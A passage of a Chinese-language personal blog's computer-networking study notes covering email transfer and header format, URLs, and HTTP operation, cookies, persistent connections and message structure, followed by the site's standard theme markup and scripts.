<p>使用C/S方式,使用TCP连接,端口号110</p>
<p>拉的意思是发送方被动,接收方主动</p>
<p><strong>"拉"</strong></p>
<h3 id="邮件发送过程">邮件发送过程:</h3>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/82a80e4ad4965a681ce5d1f29bce204d.png" /></p>
<p>1.用户通过用户代理写好信之后使用SMTP协议将邮件发送给==发送端邮件服务器==(后面称为==客户端==),客户端将该邮件放入自己的邮件缓存队列中等待发送</p>
<p>2.客户端定时检查邮件缓存队列,如果有邮件待发送,则向==接收端邮件服务器==(后面称==服务端==)发送TCP连接请求</p>
<p>3.TCP连接建立后SMTP客户端向SMTP服务端发送邮件,当SMTP客户端邮件缓存队列清空时,SMTP关闭TCP连接</p>
<p>4.服务端接收到邮件之后将邮件放入用户信箱</p>
<p>5.收信用户打算收信时,让用户代理去邮件服务器的用户信箱拉取邮件</p>
<h3 id="电子邮件格式">电子邮件格式</h3>
<p><span class="math display">\[
电子邮件
    \begin{cases}
        信封\\
        内容
            \begin{cases}
                首部\\
                主体
            \end{cases}
    \end{cases}
\]</span></p>
<p>信封完全不用用户操心,信封是从信的内容首部提取信息填写的</p>
<h4 id="内容首部">内容首部</h4>
<p>首部由首部行组成</p>
<p>首部行的格式是:<code>键:值</code></p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/5b04141ab6b1e30c79cda318b2348026.png" /></p>
<p>发件人地址From,收件人地址To等是必须内容</p>
<p>主题Subject等是非必须内容</p>
<p>其中收件人地址,主题这种信息由用户手动填写,发件人地址和发件时间自动填写</p>
<blockquote>
<p>From和To都是用户地址</p>
<p>hoopdog@hust.edu.cn</p>
<p>即 hoopdog at hust.edu.cn</p>
<p>即 位于hust.edu.cn的hoopdog</p>
<p>其中@后面的是邮件服务器地址,<span class="citation"
data-cites="前面的是用户名">@前面的是用户名</span></p>
<p>需要确保的是,同一个邮件服务器管理的用户名不能有重名(这容易理解,班上有俩个张三的时候课代表也不知道把张三的作业本给哪个张三)</p>
<p>由此可见balabala@qq.com这个地址就是qq.com邮件服务器管理的balabala用户</p>
<p>==qq.com是邮件服务器==</p>
</blockquote>
<h2 id="万维网">万维网</h2>
<p>万维网是无数网络站点和页面的集合,是因特网最主要的部分</p>
<p>因特网还包括电子邮件等</p>
<h3 id="万维网的组成">万维网的组成</h3>
<p>world wide web:资料空间</p>
<p>万维网中有用的事物称为"资源" <span class="math display">\[
万维网内核
\begin{cases}
同一资源定位符(URL)\\
超文本传输协议(HTTP)\\
超文本标记语言(HTML)
\end{cases}
\]</span>
万维网以C/S的方式工作,浏览器是万维网的客户端.万维网上资源文档所在的计算机时服务端</p>
<p>两者通信的流程:</p>
<p>1.万维网用户希望使用浏览器访问某个URL,与该URL所在的服务器建立连接,发送浏览请求</p>
<p>2.服务器把URL转换为文件路径,返回信息给客户端</p>
<p>3.通信完毕,关闭连接</p>
<h3 id="统一资源定位符url">统一资源定位符(URL)</h3>
<p>负责标识万维网上的各种文档,使每个文档有唯一的标识符(链接地址)</p>
<p>一般形式:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</span><br></pre></td></tr></table></figure>
<p>其中端口和路径可以略去不写,整个URL不区分大小写</p>
<blockquote>
<p>比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.baidu.com/</span><br></pre></td></tr></table></figure>
<p>https是协议</p>
<p>www.baidu.com是主机的DNS地址,实际上映射到220.181.38.251</p>
</blockquote>
<p>常见的协议有http,ftp,https等</p>
<h3 id="超文本传输协议http">超文本传输协议HTTP</h3>
<p>协议规定了</p>
<p>1.浏览器怎样想万维网服务器请求资源</p>
<p>2.服务器怎样把文档传给浏览器</p>
<p>即规定了怎么去和怎么回来</p>
<h4 id="http操作过程">HTTP操作过程</h4>
<p>1.客户端(浏览器)对要访问的www服务器请求DNS域名解析,获得该服务器IP地址</p>
<p>2.客户端通过TCP向服务器发起建立连接的请求,这是第一次握手</p>
<p>3.服务器在TCP的80端口监听到客户端发出的请求,与客户端建立连接,这是第二次握手</p>
<p>4.在客户端与服务器的第三次握手时客户端发送获取==服务器拥有的某个文件==的请求报文</p>
<p>5.服务器返回==该文件web页面的必须信息==(注意此时还没有完全返回该页面,只是返回了基本的框架,很多元素比如jpeg图片等需要后续继续请求才能发送)</p>
<p>6.客户端浏览器收到资源并解释,及时显示给用户</p>
<p>7.客户端一直发送请求直到页面加载完成,此时TCP连接断开</p>
<p>客户端向服务端发出的是请求,服务端向客户端发出的是响应</p>
<p>没有请求就没有响应,请求时客户端主动发出的,服务端不会多管闲事</p>
<p>请求和响应必须遵循规定的规则和格式,即HTTP</p>
<h4 id="http特点">HTTP特点</h4>
<p>1.本身无状态</p>
<p>服务器不会记录客户信息,任何客户不管第几次访问同一个页面时显示的内容都是相同的.这样设计的目的是减轻服务器的压力,使其支持大量并发的HTTP请求</p>
<blockquote>
<p>Cookie+数据库获取用户历史浏览信息</p>
<p>后来引入Cookie技术之后,服务器只需要记录客户端的身份信息,客户自己的喜好,密码等等信息都存储在客户机器上,当客户端第一次访问某个服务器时,服务器在数据库中记录该客户端的身份信息.客户端自己记录自己的个人喜好和隐私信息.</p>
<p>当客户端下一次访问这个服务器时,服务器就能从数据库记录中知道这个客户曾经来过,然后可以根据客户cookie获得客户喜好了</p>
<p>这时状态是来自cookie的辅助,与http本身无状态不矛盾</p>
</blockquote>
<p>2.传输层协议使用TCP</p>
<p><strong>3.既可以使用非持久连接,也可以使用持久连接</strong></p>
<p>非持久连接:对于客户端的每一个请求,服务器返回响应后立刻断开TCP连接</p>
<p>持久连接:服务器对于客户端的请求返回响应之后并不立刻断开TCP连接,而是等待下一次请求,直到客户端发出停止连接的要求或者连接失败</p>
<blockquote>
<p>持久连接的两种方式:</p>
<p>流水线方式:请求是串行的,客户端发出A请求,必须收到服务端的响应之后才可以发出下一个B请求</p>
<p>非流水线方式:请求是并行的,客户端一股脑发出多个请求,剩下的任务就是接收服务端的多个响应</p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/d6672322cb5522779a9cadb20b0b726e.png" /></p>
</blockquote>
<h4 id="http报文结构">HTTP报文结构</h4>
<p>HTTP面向文本,报文由ASCII码字符串组成</p>
<p>报文由两类:请求报文和响应报文</p>
<p>两种报文都是由三部分组成:</p>
<p>开始行,首部行,实体主题</p>
<p>区别在于开始行不同</p>
<p>请求报文的开始行是请求行</p>
<p>响应报文的开始行是状态行</p>
<h5 id="请求报文">请求报文</h5>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/9402acb15d554bc0a90012bffb10fa56.png" /></p>
<p>请求行=请求用到的方法+space+请求资源的URL+space+HTTP版本号+回车换行</p>
<blockquote>
<p>请求方法作用于请求对象</p>
<p>请求常用方法:</p>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/85915b69c67049cf59593f06dc430591.png" /></p>
</blockquote>
<h5 id="响应报文">响应报文</h5>
<p><img
src="https://img-blog.csdnimg.cn/img_convert/72e019bbb1ce7edd8c5f7bc9d0eaf6c7.png" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/impossible/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/9/">9</a><a class="extend next" rel="next" href="/impossible/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">33</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
